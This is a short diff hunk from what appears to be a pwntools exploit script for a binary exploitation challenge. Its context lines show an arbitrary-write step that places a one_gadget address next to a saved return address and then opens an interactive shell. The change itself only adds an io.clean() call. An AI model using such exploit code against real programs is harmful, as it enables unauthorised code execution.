@@ -91,7 +91,8 @@ def solve():
     arb_write_64(stack_saved_rip + 16, one_gadget)
 
     io.sendline()
-
+    io.clean()
+    
     io.interactive()
 
 
